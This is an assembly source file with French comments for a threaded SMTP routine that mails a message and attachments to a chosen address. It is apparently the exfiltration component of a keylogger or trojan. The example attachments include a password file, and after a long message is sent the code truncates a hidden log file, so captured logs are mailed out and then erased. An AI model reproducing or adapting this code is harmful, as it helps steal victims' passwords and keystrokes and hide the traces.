;SendMail(szServer, szDisplayName, szSenderMail, szReceiver, szSubject, szMessage, szAttachementTable)




;szServer		ex : smtp.wanadoo.fr
;szDisplayName		ex : Polux
;szSenderMail		ex : Polux565a@hotmail.com
;szReceiver		ex : Castor666@bananamail.com
;szSubject		ex : bla?
;szMessage		ex : bla bla bla
;szAttachementTable	ex : OFFSET A = c:\rus.exe OFFSET A+4 = c:\shit\Password.txt ect... end with 0/0/ (word filled with 0) 

include           c:\masm32\include\wsock32.inc
includelib        c:\masm32\lib\wsock32.lib

SendMail	PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD

PORT	equ	25

SMTP_ARGS	struct
	pServer			dd	?
	pDisplayName		dd	?
	pSenderMail		dd	?
	pReceiver		dd	?
	pSubject		dd	?
	pMessage		dd	?
	pAttachementTable	dd	?
SMTP_ARGS	ends



SendMail	proc _pServer:DWORD, _pDisplayName:DWORD, _pSenderMail:DWORD, _pReceiver:DWORD, _pSubject:DWORD, _pMessage:DWORD, _pAttachementTable:DWORD

	.data?

	smtp_a 	SMTP_ARGS	<?>
	SmtpThreadID	dd	         ?
	;hSmtpThread	dd	   	 ?
	recvbuf		db		512	dup (?)
	pAlloc		dd		?
	pAlloc2		dd		?
	.CODE

	
    	cmp     SmtpUseFlag, 0
    	jz	@F
    	ret
       @@:
	And     SmtpThreadExitCode,0		; init error
    	push    1
    	pop	    SmtpUseFlag	
	and     LogSent, 0

	push	_pServer
	pop	[smtp_a].pServer
	push	_pDisplayName
	pop	[smtp_a].pDisplayName
	push	_pSenderMail
	pop	[smtp_a].pSenderMail
	push	_pReceiver
	pop	[smtp_a].pReceiver
	push	_pSubject
	pop	[smtp_a].pSubject
	push	_pMessage
	pop	[smtp_a].pMessage
	push	_pAttachementTable
	pop	[smtp_a].pAttachementTable

	lea	ecx,[_SendMail]
	invoke	CreateThread, 0, 0, ecx, 0, 0, addr SmtpThreadID
	;mov     hSmtpThread, eax
	invoke  CloseHandle, eax; hSmtpThread
	ret
SendMail	endp


_SendMail	proc ;smtp_a:DWORD

.data
Helo_templ	db "HELO %s",0dh,0ah,0					; ServerName
Mail_From_templ db "MAIL FROM: <%s>",0dh,0ah,0				; DisplayName	
Rcpt_to_templ 	db "rcpt to: <%s>",0dh,0ah,0				; Receiver
Details_templ	db 'From: "%s" <%s>', 0dh,0ah, \
		   "To: %s", 0dh,0ah,		\
		   "Subject: %s", 0Dh, 0Ah, 0Dh, 0ah,0         ; DisplayName, DisplayName, subject

Details_templ2	db 'From: "%s" <%s>', 0dh,0ah, \
		   "To: %s", 0dh,0ah,		\
		   "Subject: %s", 0Dh, 0Ah, 0         ; DisplayName, DisplayName, subject

smtp_cmd1	db 'data',0dh,0ah,0
smtp_cmd1Size	equ	$	-	OFFSET smtp_cmd1

smtp_cmd2	db 'quit',0dh,0ah,0  
smtp_cmd2Size	equ	$	-	OFFSET smtp_cmd2

CRLF_DOT_CRLF   db 0dh,0ah,".",0dh,0ah,0
SmtpUseFlag	dd	0
BigAllocSize	dd 0

.data?
;abuse@hotmail.com
;BigBuf		db 70000	dup (?)
BigAlloc	dd ?
BBB		db ?
WSA_Data        db 400 dup (?) ;WSADATA <?> 
Sock		dd	?
sa                  sockaddr_in           <?>
pDataStart	dd	?
MsgDataSizeRgn  dd	?
SmtpThreadExitCode	dd	?
IsThisLog?	dd	?
LogSent	dd ?	
.code

    


    ;and     LogSent, 0
    invoke WSAStartup,101h , addr WSA_Data
    OR      EAX, EAX               
    JNZ     Exit

    invoke  socket, AF_INET, SOCK_STREAM, 0
    mov Sock,eax
    INC     EAX        ; Retourne -1 si erreur             
    JZ      Free_Winsock
    
    invoke  gethostbyname, [smtp_a].pServer
    or      eax,eax
    jz      Free_Winsock
 
    mov eax,[eax+12] ; move the value of h_list member into eax 
    mov eax,[eax] ; copy the pointer to the actual IP address into eax 
    mov eax,[eax] ; copy IP address into eax (voir la structure "hostent")
    mov dword ptr [sa.sin_addr],eax
    mov word ptr [sa.sin_family],AF_INET


    
    invoke htons,PORT
    mov word ptr [sa.sin_port],ax
  
    invoke connect, Sock, addr sa, sizeof sa
    or eax,eax ;blocking mode 
    jnz Free_Winsock
 
         

    call   recvlp                                  
    
    cmp     eax,' 022'			       
    jnz     Close_Socket
    .IF	    [smtp_a].pAttachementTable == NULL
	    mov   BigAllocSize, 70000
    .ENDIF

    invoke  VirtualAlloc, NULL, BigAllocSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE
    mov	    BigAlloc, eax
     
    invoke  wsprintf, BigAlloc, addr Helo_templ, [smtp_a].pServer   
    mov     eax, BigAlloc                     
    Call   _strlen
    

    invoke  send,Sock,BigAlloc,eax,0                           ;HELO !
    cmp     eax,SOCKET_ERROR
    je      Close_Socket
    
    call    recvlp

    cmp     eax,' 052'				                ;Reponse du serveur ...
    jnz     Close_Socket                                        ;S'il ne dit pas bonjour on se casse

     

    invoke  wsprintf, BigAlloc, addr Mail_From_templ, [smtp_a].pSenderMail                      
    mov     eax, BigAlloc                     
    Call   _strlen

    invoke  send,Sock,BigAlloc , eax,0          ; On s'identifie
    call    recvlp
    cmp     eax,' 052'                          ; Reponse du serveur ...
    jnz     Close_Socket
 
    

    invoke  wsprintf, BigAlloc , addr Rcpt_to_templ, [smtp_a].pReceiver
    mov     eax, BigAlloc                     
    Call   _strlen


    invoke  send,Sock,BigAlloc, eax ,0            ;Envoi rcpt to:
    call    recvlp                                      ;reponse ok ?
    cmp     eax,' 052'
    jnz     Close_Socket

    

    invoke  send,Sock,addr smtp_cmd1, smtp_cmd1Size ,0  ; DATA
    call    recvlp
    cmp     eax,' 453'				     
    jnz     Close_Socket


;----------------------------------------------------------------------------------------------
;------------------------------------ Construction du sujet -----------------------------------
;----------------------------------------------------------------------------------------------
    .IF	    [smtp_a].pAttachementTable == NULL

    invoke  wsprintf, BigAlloc, addr Details_templ, [smtp_a].pDisplayName, \
						       [smtp_a].pSenderMail, \
						       [smtp_a].pReceiver, \	
						       [smtp_a].pSubject
    .ELSE
    invoke  wsprintf, BigAlloc, addr Details_templ2,[smtp_a].pDisplayName, \
						       [smtp_a].pSenderMail, \
						       [smtp_a].pReceiver, \	
						       [smtp_a].pSubject
    .ENDIF

    mov     eax, [smtp_a].pMessage                     
    Call   _strlen
		
    .IF     EAX > 3000
	    inc   LogSent
    .ENDIF

    push    eax
    mov     eax, BigAlloc                     
    Call   _strlen
    pop	    ecx
    add     ecx, eax
    mov     MsgDataSizeRgn,ecx
    invoke  VirtualAlloc, 0, ecx, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE

    or      eax,eax
    jz      Close_Socket

    mov	    pDataStart,eax

    mov     eax, BigAlloc                     
    Call   _strlen

    mov	    ecx,eax
    mov     edi,pDataStart
    mov     esi,BigAlloc
    rep	    movsb

    ;Attachement_templ

    invoke  lstrcat, 	pDataStart, [smtp_a].pMessage	


    invoke  lstrcat, 	pDataStart, addr CRLF_DOT_CRLF	
    mov     eax, pDataStart
    call    _strlen			              


    ;.IF     EAX > 3000
    ;	mov     LogSent,1
    ;.ENDIF

    invoke  send,Sock, pDataStart , eax, 0
    call    recvlp
    cmp     eax,' 052'
    jnz     Close_Socket


                    
    invoke  send, Sock, addr smtp_cmd2,smtp_cmd2Size,0
    call    recvlp

    invoke  VirtualFree, pDataStart, MsgDataSizeRgn, MEM_DECOMMIT or MEM_RELEASE

    mov     SmtpThreadExitCode,1	; Everythings ok, mail sent!
    .IF     LogSent != 0
		       mov   eax, hLog
		       .IF   IsThisLog? == eax
                       call  CloseLogFile
                       invoke  CreateFile, addr record_file, GENERIC_READ OR GENERIC_WRITE, NULL,\ ;FILE_SHARE_READ or FILE_SHARE_WRITE,\ ;
                                          NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL
                       mov    hLog,eax 	
  		       .ENDIF
		       and   dword ptr [IsThisLog?],0
    .ENDIF
    and     LogSent, 0
Close_Socket:  
    
    invoke closesocket, Sock     
Free_Winsock:
    invoke  WSACleanup
    Exit:
    

    .IF	    [smtp_a].pAttachementTable != NULL

	invoke  VirtualFree, pAlloc, AttachementSize, MEM_DECOMMIT or MEM_RELEASE
	invoke  VirtualFree, pAlloc2, AttachementSize, MEM_DECOMMIT or MEM_RELEASE
	and     [smtp_a].pAttachementTable, NULL

    .ENDIF

    invoke  VirtualFree, BigAlloc, BigAllocSize, MEM_DECOMMIT or MEM_RELEASE
    and     SmtpUseFlag, 0
    invoke  ExitThread, SmtpThreadExitCode
      ;GetExitCodeThread 

ret


;---------------------------------------------------------------------------------------------
;------------------ Procédure de Traitement de la réponse du serveur -------------------------
;---------------------------------------------------------------------------------------------

recvlp:
    invoke  recv,Sock, addr recvbuf, 4,0
    cmp     eax,4                           ;On a reçu un dword ?
    jnz     qut

    @@:
    invoke  recv,Sock,addr [BBB],1,0
    cmp     eax,1                           ;On a reçu un octes ?
    jne     @B
    cmp     byte ptr [BBB],0ah              ;Est ce 0ah ?
    jne     @B
                                            ;Oui? cela signifie que le serveur a fini de répondre
    @@:
    qut:
    mov     eax,dword ptr [recvbuf]         ;Valeur de retour dans eax
    ret


_SendMail endp
